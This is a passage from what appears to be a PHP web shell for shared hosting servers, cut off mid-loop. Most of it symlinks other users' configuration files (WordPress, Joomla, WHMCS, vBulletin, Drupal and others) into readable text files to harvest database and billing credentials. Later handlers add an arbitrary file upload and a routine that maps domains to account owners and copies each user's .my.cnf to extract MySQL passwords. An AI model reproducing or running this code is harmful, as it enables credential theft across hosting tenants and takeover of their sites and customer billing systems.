@symlink('/home2/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
@symlink('/home2/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
@symlink('/home2/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
@symlink('/home2/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
@symlink('/home2/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
@symlink('/home2/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
@symlink('/home2/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
@symlink('/home2/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
@symlink('/home2/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/clientarea/configuration.php', $user . '-clientarea-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/autobuy/configuration.php', $user . '-autobuy-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
@symlink('/home3/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
@symlink('/home3/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
@symlink('/home3/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
@symlink('/home3/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
@symlink('/home3/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
@symlink('/home3/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
@symlink('/home3/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
@symlink('/home3/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
@symlink('/home3/' . $user . '/public_html/config.inc.php', $user . '-amember2.txt');
@symlink('/home3/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
@symlink('/home3/' . $user . '/public_html/config.php', $user . '-4images1.txt');
@symlink('/home3/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
@symlink('/home3/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
@symlink('/home3/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
@symlink('/home3/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
@symlink('/home3/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
@symlink('/home3/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
@symlink('/home3/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
@symlink('/home3/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
@symlink('/home3/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
@symlink('/home3/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
@symlink('/home3/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
@symlink('/home3/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home3/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home3/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
@symlink('/home3/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
@symlink('/home3/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
@symlink('/home3/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
@symlink('/home3/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
@symlink('/home3/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
@symlink('/home3/' . $user . '/public_html/home3/wp-config.php', $user . '-wp-home3.txt');
@symlink('/home3/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
@symlink('/home3/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
@symlink('/home3/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
@symlink('/home3/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
@symlink('/home3/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home3/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home3/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
@symlink('/home3/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
@symlink('/home3/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
@symlink('/home3/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
@symlink('/home3/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
@symlink('/home3/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
@symlink('/home3/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
@symlink('/home3/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
@symlink('/home3/' . $user . '/public_html/home3/configuration.php', $user . '-joomla-home3.txt');
@symlink('/home3/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
@symlink('/home3/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
@symlink('/home3/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
@symlink('/home3/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
@symlink('/home3/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
@symlink('/home3/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
@symlink('/home3/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
@symlink('/home3/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
@symlink('/home3/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
@symlink('/home3/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
@symlink('/home3/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
@symlink('/home3/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
@symlink('/home3/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
@symlink('/home3/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
@symlink('/home3/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
@symlink('/home3/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
@symlink('/home3/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
@symlink('/home3/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
@symlink('/home3/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
@symlink('/home3/' . $user . '/public_html/include/db.php', $user . '-7.txt');
@symlink('/home3/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
@symlink('/home3/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
@symlink('/home3/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
@symlink('/home3/' . $user . '/public_html/config.php', $user . '-4images.txt');
@symlink('/home3/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
@symlink('/home3/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
@symlink('/home3/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
@symlink('/home3/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
@symlink('/home3/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
@symlink('/home3/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
@symlink('/home3/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
@symlink('/home3/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
@symlink('/home3/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
@symlink('/home3/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
@symlink('/home3/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
@symlink('/home3/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
@symlink('/home3/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
@symlink('/home3/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
@symlink('/home3/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
@symlink('/home3/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
@symlink('/home3/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/clientarea/configuration.php', $user . '-clientarea-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/autobuy/configuration.php', $user . '-autobuy-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
@symlink('/home4/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
@symlink('/home4/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
@symlink('/home4/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
@symlink('/home4/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
@symlink('/home4/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
@symlink('/home4/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
@symlink('/home4/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
@symlink('/home4/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
@symlink('/home4/' . $user . '/public_html/config.inc.php', $user . '-amember2.txt');
@symlink('/home4/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
@symlink('/home4/' . $user . '/public_html/config.php', $user . '-4images1.txt');
@symlink('/home4/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
@symlink('/home4/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
@symlink('/home4/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
@symlink('/home4/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
@symlink('/home4/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
@symlink('/home4/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
@symlink('/home4/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
@symlink('/home4/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
@symlink('/home4/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
@symlink('/home4/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
@symlink('/home4/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
@symlink('/home4/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home4/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home4/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
@symlink('/home4/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
@symlink('/home4/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
@symlink('/home4/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
@symlink('/home4/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
@symlink('/home4/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
@symlink('/home4/' . $user . '/public_html/home4/wp-config.php', $user . '-wp-home4.txt');
@symlink('/home4/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
@symlink('/home4/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
@symlink('/home4/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
@symlink('/home4/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
@symlink('/home4/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home4/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home4/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
@symlink('/home4/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
@symlink('/home4/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
@symlink('/home4/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
@symlink('/home4/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
@symlink('/home4/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
@symlink('/home4/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
@symlink('/home4/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
@symlink('/home4/' . $user . '/public_html/home4/configuration.php', $user . '-joomla-home4.txt');
@symlink('/home4/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
@symlink('/home4/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
@symlink('/home4/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
@symlink('/home4/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
@symlink('/home4/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
@symlink('/home4/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
@symlink('/home4/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
@symlink('/home4/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
@symlink('/home4/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
@symlink('/home4/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
@symlink('/home4/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
@symlink('/home4/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
@symlink('/home4/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
@symlink('/home4/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
@symlink('/home4/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
@symlink('/home4/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
@symlink('/home4/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
@symlink('/home4/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
@symlink('/home4/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
@symlink('/home4/' . $user . '/public_html/include/db.php', $user . '-7.txt');
@symlink('/home4/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
@symlink('/home4/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
@symlink('/home4/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
@symlink('/home4/' . $user . '/public_html/config.php', $user . '-4images.txt');
@symlink('/home4/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
@symlink('/home4/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
@symlink('/home4/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
@symlink('/home4/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
@symlink('/home4/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
@symlink('/home4/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
@symlink('/home4/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
@symlink('/home4/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
@symlink('/home4/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
@symlink('/home4/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
@symlink('/home4/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
@symlink('/home4/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
@symlink('/home4/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
@symlink('/home4/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
@symlink('/home4/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
@symlink('/home4/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
@symlink('/home4/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/clientarea/configuration.php', $user . '-clientarea-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/autobuy/configuration.php', $user . '-autobuy-WHMCS.txt');}
echo '<b class="cone"><font face="Tahoma" color="#00dd00" size="2pt"><b>Done -></b> <a target="_blank" href="configs">Open configs</a></font></b>';
}
}
elseif(isset($_GET["home"]))
	{
	echo"<table><td align=center><body>
	<h2><font color=green></font></h2>";
	}
	elseif(isset($_GET["upl"]))
	{
		$disable_functions = @ini_get("disable_functions"); 
		echo "<font color='green'><br><br>DisablePHP =  </font>"."<font color='red'>".$disable_functions."</font>";
	echo"<br><br><br><center><font color=red>";
		echo"<br><form method=post enctype=multipart/form-data>"; 
		echo"<input type=file name=f><input name=k type=submit id=k value=Submit><br>"; 
		  if($_POST["k"]==pencet)
	{ 
	if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){
	echo"<b>".$_FILES["f"]["name"];
	}else{
	echo"<b>Fail ON Upload";
	}
	}
	}
elseif(isset($_GET["cp"]))
	{
@ini_set('display_errors',0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}
echo '<style>
textarea {
resize:none;
color: red ;
background-color:#ffffff;  
font-size:8pt; color:#000000;
border:1px solid white ;
border-left: 4px solid white ;
width:543px;
height:400px;
}
input {
color: #000000;
border:1px dotted white;
}
</style>';
echo '<center>';
$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");
if ($domains or $d0mains)
{
    $domains = scandir("/var/named");
    if($domains) {
echo "<table align=center><tr><th valign=top bgcolor=darkgreen class=style2> COUNT </th><th valign=top bgcolor=darkgreen > DOMAIN </th><th valign=top bgcolor=darkgreen class=style2 > USER </th><th valign=top bgcolor=darkgreen class=style2 > Password </th><th valign=top bgcolor=darkgreen class=style2 > .my.cnf </th></tr>";
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
$p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
$password=entre2v2($p,'password="','"');
